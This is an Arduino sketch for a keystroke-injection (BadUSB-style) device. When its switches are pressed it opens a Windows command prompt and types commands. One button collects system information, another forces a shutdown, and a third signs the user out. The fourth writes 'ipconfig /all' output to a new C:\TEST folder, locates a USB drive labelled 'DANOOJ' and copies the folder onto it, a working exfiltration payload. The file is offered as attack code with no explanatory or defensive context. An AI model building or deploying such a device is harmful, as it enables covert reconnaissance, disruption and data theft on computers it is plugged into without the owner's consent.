#include <Keyboard.h>                               //Including the keyboard library
#include <Mouse.h>                                  //Including the mouse library

int pinA = 2;                                       //Declaring variables for the pins
int pinB = 3;
int pinC = 4;
int pinD = 5;
int pinE = 6;

void setup() {

pinMode(pinA, INPUT_PULLUP);                        //Setting up the internal pull-ups resistors
pinMode(pinB, INPUT_PULLUP);                        //and also setting the pins to inputs.
pinMode(pinC, INPUT_PULLUP);
pinMode(pinD, INPUT_PULLUP);
pinMode(pinE, INPUT_PULLUP);

}

void loop() {

  if (digitalRead(pinA) == LOW)                     //Checking if the first switch has been pressed
  {
   // Keyboard.write("A");  
   Keyboard.press(KEY_LEFT_GUI);
   Keyboard.press('r');
   
   Keyboard.releaseAll();
   delay(100);
   Keyboard.print("cmd");
   Keyboard.press(KEY_RETURN);
   Keyboard.releaseAll();
   delay(100);
   Keyboard.print("SYSTEMINFO");
   Keyboard.press(KEY_RETURN);
   Keyboard.releaseAll();

   

   

   
   

   
   
   

    
  }

  if (digitalRead(pinB) == LOW)                     //Checking if the second switch has been pressed
  {
   Keyboard.press(KEY_LEFT_GUI);
   Keyboard.press('r');
   Keyboard.releaseAll();
   delay(100);
   Keyboard.print("cmd");
   Keyboard.press(KEY_RETURN);
   Keyboard.releaseAll();
   delay(100);
   Keyboard.print("shutdown/s");
   Keyboard.press(KEY_RETURN);
   Keyboard.releaseAll();
  }

  if (digitalRead(pinC) == LOW)                     //Checking if the third switch has been pressed
  {

   Keyboard.press(KEY_LEFT_GUI);
   Keyboard.press('x');
   delay(30);
   Keyboard.releaseAll();
  
   
   Keyboard.press('u');
   Keyboard.releaseAll();
   
   Keyboard.press('u');
   Keyboard.releaseAll();
   delay(3000);
    
  }

  if (digitalRead(pinD) == LOW)                    
  {

   Keyboard.press(KEY_LEFT_GUI);
   Keyboard.press('r');
   Keyboard.releaseAll();
   delay(100);
   Keyboard.print("cmd");
   Keyboard.press(KEY_RETURN);
   Keyboard.releaseAll();
   delay(300);
   
   Keyboard.print("cd/"); 
   Keyboard.press(KEY_RETURN);
   Keyboard.releaseAll();
   delay(300);

   Keyboard.print("mkdir TEST");
   Keyboard.press(KEY_RETURN);
   Keyboard.releaseAll();
   delay(300);

   Keyboard.print("cd C:\\TEST");
   Keyboard.press(KEY_RETURN);
   Keyboard.releaseAll();
   delay(300);

   Keyboard.print("ipconfig /all > text.txt");
   Keyboard.press(KEY_RETURN);
   Keyboard.releaseAll();
   delay(300);
   

   
   
 
   Keyboard.print("wmic logicaldisk where volumename='DANOOJ' get name");
   Keyboard.press(KEY_RETURN);
   Keyboard.releaseAll();
   delay(300);


    
   Keyboard.press(KEY_LEFT_SHIFT);
   Keyboard.press(KEY_LEFT_CTRL);
   Keyboard.press(KEY_LEFT_ARROW); 
   Keyboard.releaseAll();
   delay(200);
   Keyboard.press(KEY_LEFT_SHIFT);
   Keyboard.press(KEY_LEFT_CTRL);
   Keyboard.press(KEY_LEFT_ARROW); 
   Keyboard.releaseAll();
   delay(200);


   
   Keyboard.press(KEY_LEFT_CTRL);
   Keyboard.press('c');
   Keyboard.releaseAll();
   delay(200);


   Keyboard.print("xcopy /h /i /c /k /e /r /y C:\\TEST  ");
   Keyboard.press(KEY_LEFT_CTRL);
   Keyboard.press('v');
   Keyboard.releaseAll();
   delay(300);



   Keyboard.press(KEY_LEFT_ALT);
   Keyboard.press(KEY_F4);
   Keyboard.releaseAll();
  


  
   






   delay(10000);


  }



  if (digitalRead(pinE) == LOW)                    
  {


   
   
   
   
   

  }

 
}
